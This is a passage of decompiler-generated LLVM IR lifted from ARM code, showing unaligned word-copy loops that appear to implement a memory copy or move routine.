  %v0_16c84.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16c80

dec_label_pc_16cb0:                               ; preds = %dec_label_pc_16c80
  %v2_16cb0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16cb0, i32* @r4, align 4
  %v5_16cb0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_16cb0, i32* @r5, align 4
  %v1_16cb4 = add i32 %v0_16ca8, -4
  store i32 %v1_16cb4, i32* %r2.global-to-local, align 4
  %v3_16cb4 = add i32 %v0_16ca8, 2147483632
  %v4_16cb4 = and i32 %v1_16cb4, %v3_16cb4
  %v5_16cb4 = icmp slt i32 %v4_16cb4, 0
  store i1 %v5_16cb4, i1* %cpsr_v.global-to-local, align 1
  %v6_16cb4 = icmp slt i32 %v1_16cb4, 0
  store i1 %v6_16cb4, i1* %cpsr_n.global-to-local, align 1
  %v7_16cb4 = icmp eq i32 %v1_16cb4, 0
  store i1 %v7_16cb4, i1* %cpsr_z.global-to-local, align 1
  %v2_16cb8 = xor i1 %v6_16cb4, %v5_16cb4
  br i1 %v2_16cb8, label %dec_label_pc_16cd4, label %dec_label_pc_16cbc

dec_label_pc_16cbc:                               ; preds = %dec_label_pc_16cb0, %dec_label_pc_16c70, %dec_label_pc_16cbc
  %v1_16cc8 = phi i32 [ %v4_16cc8, %dec_label_pc_16cbc ], [ %v12_16ca4, %dec_label_pc_16cb0 ], [ %v0_16d7c76, %dec_label_pc_16c70 ]
  %v0_16cbc = load i32, i32* %lr.global-to-local, align 4
  %v3_16cbc = udiv i32 %v0_16cbc, 256
  store i32 %v3_16cbc, i32* %ip.global-to-local, align 4
  %v0_16cc0 = load i32, i32* %r1.global-to-local, align 4
  %v1_16cc0 = inttoptr i32 %v0_16cc0 to i32*
  %v2_16cc0 = load i32, i32* %v1_16cc0, align 4
  store i32 %v2_16cc0, i32* %lr.global-to-local, align 4
  %v4_16cc0 = add i32 %v0_16cc0, 4
  store i32 %v4_16cc0, i32* %r1.global-to-local, align 4
  %v4_16cc4 = mul i32 %v2_16cc0, 16777216
  %v5_16cc4 = or i32 %v4_16cc4, %v3_16cbc
  store i32 %v5_16cc4, i32* @ip, align 4
  %v2_16cc8 = inttoptr i32 %v1_16cc8 to i32*
  store i32 %v5_16cc4, i32* %v2_16cc8, align 4
  %v3_16cc8 = load i32, i32* @r0, align 4
  %v4_16cc8 = add i32 %v3_16cc8, 4
  store i32 %v4_16cc8, i32* @r0, align 4
  %v0_16ccc = load i32, i32* %r2.global-to-local, align 4
  %v1_16ccc = add i32 %v0_16ccc, -4
  store i32 %v1_16ccc, i32* %r2.global-to-local, align 4
  %v3_16ccc = sub i32 3, %v0_16ccc
  %v4_16ccc = and i32 %v3_16ccc, %v0_16ccc
  %v5_16ccc = icmp slt i32 %v4_16ccc, 0
  %v6_16ccc = icmp slt i32 %v1_16ccc, 0
  %v2_16cd0 = xor i1 %v6_16ccc, %v5_16ccc
  br i1 %v2_16cd0, label %dec_label_pc_16cd4.loopexit, label %dec_label_pc_16cbc

dec_label_pc_16cd4.loopexit:                      ; preds = %dec_label_pc_16cbc
  %v7_16ccc = icmp eq i32 %v0_16ccc, 4
  store i1 %v5_16ccc, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_16ccc, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_16ccc, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16cd4

dec_label_pc_16cd4:                               ; preds = %dec_label_pc_16cd4.loopexit, %dec_label_pc_16cb0
  %v0_16bfc59 = phi i32 [ %v1_16ccc, %dec_label_pc_16cd4.loopexit ], [ %v1_16cb4, %dec_label_pc_16cb0 ]
  %v0_16cd4 = load i32, i32* %r1.global-to-local, align 4
  %v1_16cd4 = add i32 %v0_16cd4, -3
  store i32 %v1_16cd4, i32* @r1, align 4
  br label %bb140

dec_label_pc_16cdc:                               ; preds = %dec_label_pc_16c5c
  br i1 %v2_16ce0, label %dec_label_pc_16d28, label %dec_label_pc_16ce4

dec_label_pc_16ce4:                               ; preds = %dec_label_pc_16cdc
  store i32 %v1_16cdc, i32* %r2.global-to-local, align 4
  %v3_16ce8 = load i32, i32* @r4, align 4
  store i32 %v3_16ce8, i32* %stack_var_-16, align 4
  %v6_16ce8 = load i32, i32* @r5, align 4
  store i32 %v6_16ce8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16cec

dec_label_pc_16cec:                               ; preds = %dec_label_pc_16cec.dec_label_pc_16cec_crit_edge, %dec_label_pc_16ce4
  %v0_16d10 = phi i32 [ %v12_16d10, %dec_label_pc_16cec.dec_label_pc_16cec_crit_edge ], [ %v0_16d7c76, %dec_label_pc_16ce4 ]
  %v0_16cf0 = phi i32 [ %v0_16cf0.pre, %dec_label_pc_16cec.dec_label_pc_16cec_crit_edge ], [ %v4_16c60, %dec_label_pc_16ce4 ]
  %v0_16cec = phi i32 [ %v0_16cec.pre, %dec_label_pc_16cec.dec_label_pc_16cec_crit_edge ], [ %v2_16c60, %dec_label_pc_16ce4 ]
  %v3_16cec = udiv i32 %v0_16cec, 65536
  %v1_16cf0 = inttoptr i32 %v0_16cf0 to i32*
  %v2_16cf0 = load i32, i32* %v1_16cf0, align 4
  store i32 %v2_16cf0, i32* %r4.global-to-local, align 4
  %v3_16cf0 = add i32 %v0_16cf0, 4
  %v4_16cf0 = inttoptr i32 %v3_16cf0 to i32*
  %v5_16cf0 = load i32, i32* %v4_16cf0, align 4
  store i32 %v5_16cf0, i32* %r5.global-to-local, align 4
  %v6_16cf0 = add i32 %v0_16cf0, 8
  %v7_16cf0 = inttoptr i32 %v6_16cf0 to i32*
  %v8_16cf0 = load i32, i32* %v7_16cf0, align 4
  store i32 %v8_16cf0, i32* %ip.global-to-local, align 4
  %v9_16cf0 = add i32 %v0_16cf0, 12
  %v10_16cf0 = inttoptr i32 %v9_16cf0 to i32*
  %v11_16cf0 = load i32, i32* %v10_16cf0, align 4
  store i32 %v11_16cf0, i32* %lr.global-to-local, align 4
  %v12_16cf0 = add i32 %v0_16cf0, 16
  store i32 %v12_16cf0, i32* %r1.global-to-local, align 4
  %v4_16cf4 = mul i32 %v2_16cf0, 65536
  %v5_16cf4 = or i32 %v4_16cf4, %v3_16cec
  store i32 %v5_16cf4, i32* @r3, align 4
  %v3_16cf8 = udiv i32 %v2_16cf0, 65536
  %v4_16cfc = mul i32 %v5_16cf0, 65536
  %v5_16cfc = or i32 %v4_16cfc, %v3_16cf8
  store i32 %v5_16cfc, i32* %r4.global-to-local, align 4
  %v3_16d00 = udiv i32 %v5_16cf0, 65536
  %v4_16d04 = mul i32 %v8_16cf0, 65536
  %v5_16d04 = or i32 %v4_16d04, %v3_16d00
  store i32 %v5_16d04, i32* %r5.global-to-local, align 4
  %v3_16d08 = udiv i32 %v8_16cf0, 65536
  %v4_16d0c = mul i32 %v11_16cf0, 65536
  %v5_16d0c = or i32 %v4_16d0c, %v3_16d08
  store i32 %v5_16d0c, i32* @ip, align 4
  %v1_16d10 = inttoptr i32 %v0_16d10 to i32*
  store i32 %v5_16cf4, i32* %v1_16d10, align 4
  %v3_16d10 = add i32 %v0_16d10, 4
  %v4_16d10 = inttoptr i32 %v3_16d10 to i32*
  %v5_16d10 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16d10, i32* %v4_16d10, align 4
  %v6_16d10 = add i32 %v0_16d10, 8
  %v7_16d10 = inttoptr i32 %v6_16d10 to i32*
  %v8_16d10 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_16d10, i32* %v7_16d10, align 4
  %v9_16d10 = add i32 %v0_16d10, 12
  %v10_16d10 = inttoptr i32 %v9_16d10 to i32*
  %v11_16d10 = load i32, i32* @ip, align 4
  store i32 %v11_16d10, i32* %v10_16d10, align 4
  %v12_16d10 = add i32 %v0_16d10, 16
  store i32 %v12_16d10, i32* @r0, align 4
  %v0_16d14 = load i32, i32* %r2.global-to-local, align 4
  %v1_16d14 = add i32 %v0_16d14, -16
  store i32 %v1_16d14, i32* %r2.global-to-local, align 4
  %v3_16d14 = sub i32 15, %v0_16d14
  %v4_16d14 = and i32 %v3_16d14, %v0_16d14
  %v5_16d14 = icmp slt i32 %v4_16d14, 0
  %v6_16d14 = icmp slt i32 %v1_16d14, 0
  %v2_16d18 = xor i1 %v6_16d14, %v5_16d14
  br i1 %v2_16d18, label %dec_label_pc_16d1c, label %dec_label_pc_16cec.dec_label_pc_16cec_crit_edge

dec_label_pc_16cec.dec_label_pc_16cec_crit_edge:  ; preds = %dec_label_pc_16cec
  %v0_16cec.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_16cf0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16cec

dec_label_pc_16d1c:                               ; preds = %dec_label_pc_16cec
  %v2_16d1c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16d1c, i32* @r4, align 4
  %v5_16d1c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_16d1c, i32* @r5, align 4
  %v1_16d20 = add i32 %v0_16d14, -4
  store i32 %v1_16d20, i32* %r2.global-to-local, align 4
  %v3_16d20 = add i32 %v0_16d14, 2147483632
  %v4_16d20 = and i32 %v1_16d20, %v3_16d20
  %v5_16d20 = icmp slt i32 %v4_16d20, 0
  store i1 %v5_16d20, i1* %cpsr_v.global-to-local, align 1
  %v6_16d20 = icmp slt i32 %v1_16d20, 0
  store i1 %v6_16d20, i1* %cpsr_n.global-to-local, align 1
  %v7_16d20 = icmp eq i32 %v1_16d20, 0
  store i1 %v7_16d20, i1* %cpsr_z.global-to-local, align 1
  %v2_16d24 = xor i1 %v6_16d20, %v5_16d20
  br i1 %v2_16d24, label %dec_label_pc_16d40, label %dec_label_pc_16d28

dec_label_pc_16d28:                               ; preds = %dec_label_pc_16d1c, %dec_label_pc_16cdc, %dec_label_pc_16d28
  %v1_16d34 = phi i32 [ %v4_16d34, %dec_label_pc_16d28 ], [ %v12_16d10, %dec_label_pc_16d1c ], [ %v0_16d7c76, %dec_label_pc_16cdc ]
  %v0_16d28 = load i32, i32* %lr.global-to-local, align 4
  %v3_16d28 = udiv i32 %v0_16d28, 65536
  store i32 %v3_16d28, i32* %ip.global-to-local, align 4
  %v0_16d2c = load i32, i32* %r1.global-to-local, align 4
  %v1_16d2c = inttoptr i32 %v0_16d2c to i32*
  %v2_16d2c = load i32, i32* %v1_16d2c, align 4
  store i32 %v2_16d2c, i32* %lr.global-to-local, align 4
  %v4_16d2c = add i32 %v0_16d2c, 4
  store i32 %v4_16d2c, i32* %r1.global-to-local, align 4
  %v4_16d30 = mul i32 %v2_16d2c, 65536
  %v5_16d30 = or i32 %v4_16d30, %v3_16d28
  store i32 %v5_16d30, i32* @ip, align 4
  %v2_16d34 = inttoptr i32 %v1_16d34 to i32*
  store i32 %v5_16d30, i32* %v2_16d34, align 4
  %v3_16d34 = load i32, i32* @r0, align 4
  %v4_16d34 = add i32 %v3_16d34, 4
  store i32 %v4_16d34, i32* @r0, align 4
  %v0_16d38 = load i32, i32* %r2.global-to-local, align 4
  %v1_16d38 = add i32 %v0_16d38, -4
  store i32 %v1_16d38, i32* %r2.global-to-local, align 4
  %v3_16d38 = sub i32 3, %v0_16d38
  %v4_16d38 = and i32 %v3_16d38, %v0_16d38
  %v5_16d38 = icmp slt i32 %v4_16d38, 0
  %v6_16d38 = icmp slt i32 %v1_16d38, 0
  %v2_16d3c = xor i1 %v6_16d38, %v5_16d38
  br i1 %v2_16d3c, label %dec_label_pc_16d40.loopexit, label %dec_label_pc_16d28

dec_label_pc_16d40.loopexit:                      ; preds = %dec_label_pc_16d28
  %v7_16d38 = icmp eq i32 %v0_16d38, 4
  store i1 %v5_16d38, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_16d38, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_16d38, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16d40

dec_label_pc_16d40:                               ; preds = %dec_label_pc_16d40.loopexit, %dec_label_pc_16d1c
  %v0_16bfc60 = phi i32 [ %v1_16d38, %dec_label_pc_16d40.loopexit ], [ %v1_16d20, %dec_label_pc_16d1c ]
  %v0_16d40 = load i32, i32* %r1.global-to-local, align 4
  %v1_16d40 = add i32 %v0_16d40, -2
  store i32 %v1_16d40, i32* @r1, align 4
  br label %bb140

dec_label_pc_16d48:                               ; preds = %dec_label_pc_16c5c
  br i1 %v2_16ce0, label %dec_label_pc_16d94, label %dec_label_pc_16d50

dec_label_pc_16d50:                               ; preds = %dec_label_pc_16d48
  store i32 %v1_16cdc, i32* %r2.global-to-local, align 4
  %v3_16d54 = load i32, i32* @r4, align 4
  store i32 %v3_16d54, i32* %stack_var_-16, align 4
  %v6_16d54 = load i32, i32* @r5, align 4
  store i32 %v6_16d54, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16d58

dec_label_pc_16d58:                               ; preds = %dec_label_pc_16d58.dec_label_pc_16d58_crit_edge, %dec_label_pc_16d50
  %v0_16d7c = phi i32 [ %v12_16d7c, %dec_label_pc_16d58.dec_label_pc_16d58_crit_edge ], [ %v0_16d7c76, %dec_label_pc_16d50 ]
  %v0_16d5c = phi i32 [ %v0_16d5c.pre, %dec_label_pc_16d58.dec_label_pc_16d58_crit_edge ], [ %v4_16c60, %dec_label_pc_16d50 ]
  %v0_16d58 = phi i32 [ %v0_16d58.pre, %dec_label_pc_16d58.dec_label_pc_16d58_crit_edge ], [ %v2_16c60, %dec_label_pc_16d50 ]
  %v3_16d58 = udiv i32 %v0_16d58, 16777216
  %v1_16d5c = inttoptr i32 %v0_16d5c to i32*
  %v2_16d5c = load i32, i32* %v1_16d5c, align 4
  store i32 %v2_16d5c, i32* %r4.global-to-local, align 4
  %v3_16d5c = add i32 %v0_16d5c, 4
  %v4_16d5c = inttoptr i32 %v3_16d5c to i32*
  %v5_16d5c = load i32, i32* %v4_16d5c, align 4
  store i32 %v5_16d5c, i32* %r5.global-to-local, align 4
  %v6_16d5c = add i32 %v0_16d5c, 8
  %v7_16d5c = inttoptr i32 %v6_16d5c to i32*
  %v8_16d5c = load i32, i32* %v7_16d5c, align 4
  store i32 %v8_16d5c, i32* %ip.global-to-local, align 4
  %v9_16d5c = add i32 %v0_16d5c, 12
  %v10_16d5c = inttoptr i32 %v9_16d5c to i32*
  %v11_16d5c = load i32, i32* %v10_16d5c, align 4
  store i32 %v11_16d5c, i32* %lr.global-to-local, align 4
  %v12_16d5c = add i32 %v0_16d5c, 16
  store i32 %v12_16d5c, i32* %r1.global-to-local, align 4
  %v4_16d60 = mul i32 %v2_16d5c, 256
  %v5_16d60 = or i32 %v4_16d60, %v3_16d58
  store i32 %v5_16d60, i32* @r3, align 4
  %v3_16d64 = udiv i32 %v2_16d5c, 16777216
  %v4_16d68 = mul i32 %v5_16d5c, 256
  %v5_16d68 = or i32 %v4_16d68, %v3_16d64
  store i32 %v5_16d68, i32* %r4.global-to-local, align 4
  %v3_16d6c = udiv i32 %v5_16d5c, 16777216
  %v4_16d70 = mul i32 %v8_16d5c, 256
  %v5_16d70 = or i32 %v4_16d70, %v3_16d6c
  store i32 %v5_16d70, i32* %r5.global-to-local, align 4
  %v3_16d74 = udiv i32 %v8_16d5c, 16777216
  %v4_16d78 = mul i32 %v11_16d5c, 256
  %v5_16d78 = or i32 %v4_16d78, %v3_16d74
  store i32 %v5_16d78, i32* @ip, align 4
  %v1_16d7c = inttoptr i32 %v0_16d7c to i32*
  store i32 %v5_16d60, i32* %v1_16d7c, align 4
  %v3_16d7c = add i32 %v0_16d7c, 4
  %v4_16d7c = inttoptr i32 %v3_16d7c to i32*
  %v5_16d7c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16d7c, i32* %v4_16d7c, align 4
  %v6_16d7c = add i32 %v0_16d7c, 8
  %v7_16d7c = inttoptr i32 %v6_16d7c to i32*
  %v8_16d7c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_16d7c, i32* %v7_16d7c, align 4
  %v9_16d7c = add i32 %v0_16d7c, 12
  %v10_16d7c = inttoptr i32 %v9_16d7c to i32*
  %v11_16d7c = load i32, i32* @ip, align 4
  store i32 %v11_16d7c, i32* %v10_16d7c, align 4
  %v12_16d7c = add i32 %v0_16d7c, 16
  store i32 %v12_16d7c, i32* @r0, align 4
  %v0_16d80 = load i32, i32* %r2.global-to-local, align 4
  %v1_16d80 = add i32 %v0_16d80, -16
  store i32 %v1_16d80, i32* %r2.global-to-local, align 4
  %v3_16d80 = sub i32 15, %v0_16d80
  %v4_16d80 = and i32 %v3_16d80, %v0_16d80
  %v5_16d80 = icmp slt i32 %v4_16d80, 0
  %v6_16d80 = icmp slt i32 %v1_16d80, 0
  %v2_16d84 = xor i1 %v6_16d80, %v5_16d80
  br i1 %v2_16d84, label %dec_label_pc_16d88, label %dec_label_pc_16d58.dec_label_pc_16d58_crit_edge

dec_label_pc_16d58.dec_label_pc_16d58_crit_edge:  ; preds = %dec_label_pc_16d58
  %v0_16d58.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_16d5c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16d58

dec_label_pc_16d88:                               ; preds = %dec_label_pc_16d58
  %v2_16d88 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16d88, i32* @r4, align 4
  %v5_16d88 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_16d88, i32* @r5, align 4
  %v1_16d8c = add i32 %v0_16d80, -4
  store i32 %v1_16d8c, i32* %r2.global-to-local, align 4
  %v3_16d8c = add i32 %v0_16d80, 2147483632
  %v4_16d8c = and i32 %v1_16d8c, %v3_16d8c
  %v5_16d8c = icmp slt i32 %v4_16d8c, 0
  store i1 %v5_16d8c, i1* %cpsr_v.global-to-local, align 1
  %v6_16d8c = icmp slt i32 %v1_16d8c, 0
  store i1 %v6_16d8c, i1* %cpsr_n.global-to-local, align 1
  %v7_16d8c = icmp eq i32 %v1_16d8c, 0
  store i1 %v7_16d8c, i1* %cpsr_z.global-to-local, align 1
  %v2_16d90 = xor i1 %v6_16d8c, %v5_16d8c
  br i1 %v2_16d90, label %dec_label_pc_16dac, label %dec_label_pc_16d94

dec_label_pc_16d94:                               ; preds = %dec_label_pc_16d88, %dec_label_pc_16d48, %dec_label_pc_16d94
  %v1_16da0 = phi i32 [ %v4_16da0, %dec_label_pc_16d94 ], [ %v12_16d7c, %dec_label_pc_16d88 ], [ %v0_16d7c76, %dec_label_pc_16d48 ]
  %v0_16d94 = load i32, i32* %lr.global-to-local, align 4
  %v3_16d94 = udiv i32 %v0_16d94, 16777216
  store i32 %v3_16d94, i32* %ip.global-to-local, align 4
  %v0_16d98 = load i32, i32* %r1.global-to-local, align 4
  %v1_16d98 = inttoptr i32 %v0_16d98 to i32*
  %v2_16d98 = load i32, i32* %v1_16d98, align 4
  store i32 %v2_16d98, i32* %lr.global-to-local, align 4
  %v4_16d98 = add i32 %v0_16d98, 4
  store i32 %v4_16d98, i32* %r1.global-to-local, align 4
  %v4_16d9c = mul i32 %v2_16d98, 256
  %v5_16d9c = or i32 %v4_16d9c, %v3_16d94
  store i32 %v5_16d9c, i32* @ip, align 4
  %v2_16da0 = inttoptr i32 %v1_16da0 to i32*
  store i32 %v5_16d9c, i32* %v2_16da0, align 4
  %v3_16da0 = load i32, i32* @r0, align 4
  %v4_16da0 = add i32 %v3_16da0, 4
  store i32 %v4_16da0, i32* @r0, align 4
  %v0_16da4 = load i32, i32* %r2.global-to-local, align 4
  %v1_16da4 = add i32 %v0_16da4, -4
  store i32 %v1_16da4, i32* %r2.global-to-local, align 4
  %v3_16da4 = sub i32 3, %v0_16da4
  %v4_16da4 = and i32 %v3_16da4, %v0_16da4
  %v5_16da4 = icmp slt i32 %v4_16da4, 0
  %v6_16da4 = icmp slt i32 %v1_16da4, 0
  %v2_16da8 = xor i1 %v6_16da4, %v5_16da4
  br i1 %v2_16da8, label %dec_label_pc_16dac.loopexit, label %dec_label_pc_16d94

dec_label_pc_16dac.loopexit:                      ; preds = %dec_label_pc_16d94
  %v7_16da4 = icmp eq i32 %v0_16da4, 4
  store i1 %v5_16da4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_16da4, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_16da4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16dac

dec_label_pc_16dac:                               ; preds = %dec_label_pc_16dac.loopexit, %dec_label_pc_16d88
  %v0_16bfc61 = phi i32 [ %v1_16da4, %dec_label_pc_16dac.loopexit ], [ %v1_16d8c, %dec_label_pc_16d88 ]
  %v0_16dac = load i32, i32* %r1.global-to-local, align 4
  %v1_16dac = add i32 %v0_16dac, -1
  store i32 %v1_16dac, i32* @r1, align 4
  br label %bb140

dec_label_pc_16db4:                               ; preds = %entry
  %v1_16db4 = load i32, i32* @r2, align 4
  %v2_16db4 = add i32 %v1_16db4, %v0_16b60
  store i32 %v2_16db4, i32* %r1.global-to-local, align 4
  %v2_16db8 = add i32 %v1_16db4, %v1_16b60
  store i32 %v2_16db8, i32* %r0.global-to-local, align 4
  %v2_16dbc = add i32 %v1_16db4, -4
  store i32 %v2_16dbc, i32* %r2.global-to-local, align 4
  %v4_16dbc = sub i32 3, %v1_16db4
  %v5_16dbc = and i32 %v4_16dbc, %v1_16db4
  %v6_16dbc = icmp slt i32 %v5_16dbc, 0
  store i1 %v6_16dbc, i1* %cpsr_v.global-to-local, align 1
  %v7_16dbc = icmp slt i32 %v2_16dbc, 0
  store i1 %v7_16dbc, i1* %cpsr_n.global-to-local, align 1
  %v8_16dbc = icmp eq i32 %v1_16db4, 4
  store i1 %v8_16dbc, i1* %cpsr_z.global-to-local, align 1
  %v5_16dc0 = icmp slt i32 %v1_16db4, 4
  br i1 %v5_16dc0, label %bb150, label %dec_label_pc_16dc4

dec_label_pc_16dc4:                               ; preds = %dec_label_pc_16db4
  %v1_16dc4 = urem i32 %v2_16db8, 4
  store i32 %v1_16dc4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16dc4 = icmp eq i32 %v1_16dc4, 0
  store i1 %v2_16dc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16dc4, label %dec_label_pc_16dcc, label %dec_label_pc_16e6c

dec_label_pc_16dcc:                               ; preds = %dec_label_pc_16dc4
  %v1_16dcc = urem i32 %v2_16db4, 4
  store i32 %v1_16dcc, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16dcc = icmp eq i32 %v1_16dcc, 0
  store i1 %v2_16dcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16dcc, label %dec_label_pc_16dd4, label %dec_label_pc_16e98

dec_label_pc_16dd4:                               ; preds = %dec_label_pc_16dcc, %dec_label_pc_16e90
  %v0_16dec37 = phi i32 [ %v2_16db8, %dec_label_pc_16dcc ], [ %v0_16ee020, %dec_label_pc_16e90 ]
  %v0_16de836 = phi i32 [ %v2_16db4, %dec_label_pc_16dcc ], [ %v0_16e90, %dec_label_pc_16e90 ]
  %v0_16dd4 = phi i32 [ %v2_16dbc, %dec_label_pc_16dcc ], [ %v2_16e88, %dec_label_pc_16e90 ]
  %v2_16dd4 = add i32 %v0_16dd4, -8
  store i32 %v2_16dd4, i32* %r2.global-to-local, align 4
  %v4_16dd4 = sub i32 7, %v0_16dd4
  %v5_16dd4 = and i32 %v4_16dd4, %v0_16dd4
  %v6_16dd4 = icmp slt i32 %v5_16dd4, 0
  store i1 %v6_16dd4, i1* %cpsr_v.global-to-local, align 1
  %v7_16dd4 = icmp slt i32 %v2_16dd4, 0
  store i1 %v7_16dd4, i1* %cpsr_n.global-to-local, align 1
  %v8_16dd4 = icmp eq i32 %v0_16dd4, 8
  store i1 %v8_16dd4, i1* %cpsr_z.global-to-local, align 1
  %v5_16dd8 = icmp slt i32 %v0_16dd4, 8
  br i1 %v5_16dd8, label %dec_label_pc_16e24, label %dec_label_pc_16ddc

dec_label_pc_16ddc:                               ; preds = %dec_label_pc_16dd4
  %v3_16ddc = load i32, i32* @r4, align 4
  %v5_16ddc = inttoptr i32 %v3_16ddc to i8*
  store i8* %v5_16ddc, i8** %stack_var_-8, align 4
  %v8_16ddc = load i32, i32* @lr, align 4
  %v2_16de0 = add i32 %v0_16dd4, -28
  store i32 %v2_16de0, i32* %r2.global-to-local, align 4
  %v4_16de0 = sub i32 27, %v0_16dd4
  %v5_16de0 = and i32 %v4_16de0, %v2_16dd4
  %v6_16de0 = icmp slt i32 %v5_16de0, 0
  store i1 %v6_16de0, i1* %cpsr_v.global-to-local, align 1
  %v7_16de0 = icmp slt i32 %v2_16de0, 0
  store i1 %v7_16de0, i1* %cpsr_n.global-to-local, align 1
  %v8_16de0 = icmp eq i32 %v2_16dd4, 20
  store i1 %v8_16de0, i1* %cpsr_z.global-to-local, align 1
  %v5_16de4 = icmp slt i32 %v2_16dd4, 20
  br i1 %v5_16de4, label %dec_label_pc_16e00, label %dec_label_pc_16de8

dec_label_pc_16de8:                               ; preds = %dec_label_pc_16ddc, %dec_label_pc_16de8.dec_label_pc_16de8_crit_edge
  %v0_16dec = phi i32 [ %v1_16df4, %dec_label_pc_16de8.dec_label_pc_16de8_crit_edge ], [ %v0_16dec37, %dec_label_pc_16ddc ]
  %v0_16de8 = phi i32 [ %v0_16de8.pre, %dec_label_pc_16de8.dec_label_pc_16de8_crit_edge ], [ %v0_16de836, %dec_label_pc_16ddc ]
  %v1_16de8 = add i32 %v0_16de8, -4
  %v2_16de8 = inttoptr i32 %v1_16de8 to i32*
  %v3_16de8 = load i32, i32* %v2_16de8, align 4
  %v4_16de8 = add i32 %v0_16de8, -8
  %v5_16de8 = inttoptr i32 %v4_16de8 to i32*
  %v6_16de8 = load i32, i32* %v5_16de8, align 4
  store i32 %v6_16de8, i32* %r4.global-to-local, align 4
  %v7_16de8 = add i32 %v0_16de8, -12
  %v8_16de8 = inttoptr i32 %v7_16de8 to i32*
  %v9_16de8 = load i32, i32* %v8_16de8, align 4
  store i32 %v9_16de8, i32* %ip.global-to-local, align 4
  %v10_16de8 = add i32 %v0_16de8, -16
  %v11_16de8 = inttoptr i32 %v10_16de8 to i32*
  %v12_16de8 = load i32, i32* %v11_16de8, align 4
  store i32 %v12_16de8, i32* %lr.global-to-local, align 4
  store i32 %v10_16de8, i32* %r1.global-to-local, align 4
  %v1_16dec = add i32 %v0_16dec, -16
  %v2_16dec = inttoptr i32 %v1_16dec to i32*
  store i32 %v3_16de8, i32* %v2_16dec, align 4
  %v4_16dec = add i32 %v0_16dec, -12
  %v5_16dec = inttoptr i32 %v4_16dec to i32*
  %v6_16dec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_16dec, i32* %v5_16dec, align 4
  %v7_16dec = add i32 %v0_16dec, -8
  %v8_16dec = inttoptr i32 %v7_16dec to i32*
  %v9_16dec = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_16dec, i32* %v8_16dec, align 4
  %v10_16dec = add i32 %v0_16dec, -4
  %v11_16dec = inttoptr i32 %v10_16dec to i32*
  %v12_16dec = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16dec, i32* %v11_16dec, align 4
  store i32 %v1_16dec, i32* %r0.global-to-local, align 4
  %v0_16df0 = load i32, i32* %r1.global-to-local, align 4
  %v1_16df0 = add i32 %v0_16df0, -4
  %v2_16df0 = inttoptr i32 %v1_16df0 to i32*
  %v3_16df0 = load i32, i32* %v2_16df0, align 4
  store i32 %v3_16df0, i32* @r3, align 4
  %v4_16df0 = add i32 %v0_16df0, -8
  %v5_16df0 = inttoptr i32 %v4_16df0 to i32*
  %v6_16df0 = load i32, i32* %v5_16df0, align 4
  store i32 %v6_16df0, i32* %r4.global-to-local, align 4
  %v7_16df0 = add i32 %v0_16df0, -12
  %v8_16df0 = inttoptr i32 %v7_16df0 to i32*
  %v9_16df0 = load i32, i32* %v8_16df0, align 4
  store i32 %v9_16df0, i32* @ip, align 4
  %v10_16df0 = add i32 %v0_16df0, -16
  %v11_16df0 = inttoptr i32 %v10_16df0 to i32*
  %v12_16df0 = load i32, i32* %v11_16df0, align 4
  store i32 %v12_16df0, i32* %lr.global-to-local, align 4
  store i32 %v10_16df0, i32* %r1.global-to-local, align 4
  %v1_16df4 = add i32 %v0_16dec, -32
  %v2_16df4 = inttoptr i32 %v1_16df4 to i32*
  store i32 %v3_16df0, i32* %v2_16df4, align 4
  %v4_16df4 = add i32 %v0_16dec, -28
  %v5_16df4 = inttoptr i32 %v4_16df4 to i32*
  %v6_16df4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_16df4, i32* %v5_16df4, align 4
  %v7_16df4 = add i32 %v0_16dec, -24
  %v8_16df4 = inttoptr i32 %v7_16df4 to i32*
  %v9_16df4 = load i32, i32* @ip, align 4
  store i32 %v9_16df4, i32* %v8_16df4, align 4
  %v10_16df4 = add i32 %v0_16dec, -20
  %v11_16df4 = inttoptr i32 %v10_16df4 to i32*
  %v12_16df4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16df4, i32* %v11_16df4, align 4
  store i32 %v1_16df4, i32* %r0.global-to-local, align 4
  %v0_16df8 = load i32, i32* %r2.global-to-local, align 4
  %v2_16df8 = add i32 %v0_16df8, -32
  store i32 %v2_16df8, i32* %r2.global-to-local, align 4
  %v6_16dfc = icmp slt i32 %v0_16df8, 32
  br i1 %v6_16dfc, label %dec_label_pc_16e00.loopexit, label %dec_label_pc_16de8.dec_label_pc_16de8_crit_edge

dec_label_pc_16de8.dec_label_pc_16de8_crit_edge:  ; preds = %dec_label_pc_16de8
  %v0_16de8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16de8

